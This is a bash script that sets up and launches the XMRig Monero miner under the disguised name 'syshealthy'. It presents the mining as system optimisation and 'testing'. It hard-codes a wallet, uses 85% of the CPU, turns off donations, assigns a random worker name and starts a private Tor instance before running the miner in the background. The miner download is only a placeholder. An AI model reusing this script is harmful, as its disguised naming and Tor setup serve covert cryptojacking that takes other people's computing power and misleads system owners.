#!/bin/bash
# all2.sh - Optimize system, then setup and start testing (like all.sh)
# Usage: sudo bash all2.sh

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# 2. Continue with testing setup and start (like all.sh)

# --- CONFIGURE THESE ---
WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="localhost:8080"
CPU_PCT=85
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
CONFIG_DIR="$SCRIPT_DIR/config"
CONFIG_FILE="$SCRIPT_DIR/config.json"

# Ensure dependencies
for dep in curl jq tor; do
  if ! command -v $dep >/dev/null 2>&1; then
    echo "$dep not found. Installing..."
    sudo apt-get update && sudo apt-get install -y $dep
  fi
done


# Download syshealthy (XMRig) if not present
if [ ! -f "$SCRIPT_DIR/syshealthy" ]; then
  echo "Downloading syshealthy tool..."
  # Placeholder for download logic
  touch "$SCRIPT_DIR/syshealthy"
  chmod +x "$SCRIPT_DIR/syshealthy"
fi

mkdir -p "$CONFIG_DIR"

cat > "$CONFIG_FILE" <<EOF
{
  "autosave": true,
  "background": false,
  "colors": true,
  "title": true,
  "randomx": {
    "init": -1,
    "init-avx2": -1,
    "mode": "auto",
    "1gb-pages": false,
    "rdmsr": true,
    "wrmsr": true,
    "cache_qos": false,
    "numa": true,
    "scratchpad_prefetch_mode": 1
  },
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": false,
    "hw-aes": null,
    "priority": 5,
    "memory-pool": true,
    "yield": true,
    "asm": true,
    "max-threads-hint": $CPU_PCT
  },
  "log-file": "$SCRIPT_DIR/xmrig.log",
  "donate-level": 0,
  "donate-over-proxy": 0,
  "pools": [
    {
      "algo": null,
      "coin": null,
      "url": "$POOL_URL",
      "user": "$WALLET.$WORKER_NAME",
      "pass": "x",
      "rig-id": "$WORKER_NAME",
      "nicehash": false,
      "keepalive": true,
      "enabled": true,
      "tls": false,
      "sni": false,
      "tls-fingerprint": null,
      "daemon": false,
      "socks5": null,
      "self-select": null,
      "submit-to-origin": false
    }
  ],
  "retries": 5,
  "retry-pause": 5,
  "print-time": 60,
  "dmi": true,
  "syslog": false,
  "verbose": 0,
  "watch": true
}
EOF


# --- Tor setup and verification ---

# Use a random available port for Tor SocksPort
TOR_PORT=$((9050 + RANDOM % 1000))
TORRC="/tmp/torrc_local_$TOR_PORT"
TORDATA="/tmp/tor_data_local_$TOR_PORT"
rm -rf "$TORDATA" 2>/dev/null || true
mkdir -p "$TORDATA"
chmod 700 "$TORDATA"

if [ ! -f "$TORRC" ]; then
  cat > "$TORRC" <<TOREOF
DataDirectory $TORDATA
SocksPort $TOR_PORT
Log notice stdout
RunAsDaemon 1
TOREOF
fi

# Stop any running tester before starting
if pgrep -f "$SCRIPT_DIR/syshealthy" > /dev/null; then
  echo "[all2.sh] Stopping running tester..."
  pkill -f "$SCRIPT_DIR/syshealthy"
  sleep 2
fi

# Install tor if not present, using Tor Project repo if needed
if ! command -v tor >/dev/null 2>&1; then
  echo "[all2.sh] Tor not found. Attempting to install..."
  if ! sudo apt-get update && sudo apt-get install -y tor; then
    echo "[all2.sh] Default install failed. Adding Tor Project repository."
    sudo apt-get install -y gnupg2
    sudo wget -O /usr/share/keyrings/tor-archive-keyring.gpg https://deb.torproject.org/torproject.org/keys/tor-archive-keyring.gpg
    echo "deb [signed-by=/usr/share/keyrings/tor-archive-keyring.gpg] https://deb.torproject.org/torproject.org $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/tor.list
    sudo apt-get update
    sudo apt-get install -y tor
  fi
  if ! command -v tor >/dev/null 2>&1; then
    echo "[all2.sh] Tor installation failed. Aborting."
    exit 1
  fi
fi

# Kill any existing Tor processes to avoid conflicts
pkill -f "tor -f $TORRC" 2>/dev/null || true
sleep 1

echo "[all2.sh] Starting Tor..."
nohup tor -f "$TORRC" > /tmp/tor_startup_$TOR_PORT.log 2>&1 &
sleep 5

# Check if Tor is running and listening on the chosen port
if pgrep -f "tor.*$TORRC" > /dev/null; then
  if netstat -an | grep -q "$TOR_PORT.*LISTEN"; then
    echo "[all2.sh] Tor started and is listening on port $TOR_PORT."
  else
    echo "[all2.sh] Tor process running but not listening on $TOR_PORT. Check /tmp/tor_startup_$TOR_PORT.log. Aborting miner start."
    exit 1
  fi
else
  echo "[all2.sh] Error: Tor process did not start. Output:"
  cat /tmp/tor_startup_$TOR_PORT.log
  exit 1
fi

LOGFILE="$SCRIPT_DIR/xmrig.log"
echo "[all2.sh] Starting tester..."
nohup stdbuf -oL "$SCRIPT_DIR/syshealthy" -c "$CONFIG_FILE" >> "$LOGFILE" 2>&1 &
sleep 2

if pgrep -f "$SCRIPT_DIR/syshealthy" > /dev/null; then
  echo "[all2.sh] Tester started successfully."
  TESTER_PID=$(pgrep -f "$SCRIPT_DIR/syshealthy" | head -1)
  echo "[all2.sh] Tester PID: $TESTER_PID"
else
  echo "[all2.sh] Error: Failed to start tester. Check $LOGFILE"
fi

echo ""
echo "========================================"
echo "  ✓ Testing is now running!"
echo "========================================"
echo ""

# After testing starts, open the tester log and keep it open until ctrl+c
echo ""
echo "Tailing tester log. Press Ctrl+C to exit."

# Log check: ensure log file is being written
sleep 5
if [ ! -s "$LOGFILE" ]; then
  echo "[all2.sh] Warning: Log file $LOGFILE is empty. Tester may not be running correctly."
else
  echo "[all2.sh] Log file $LOGFILE is being written."
fi
tail -f "$LOGFILE"
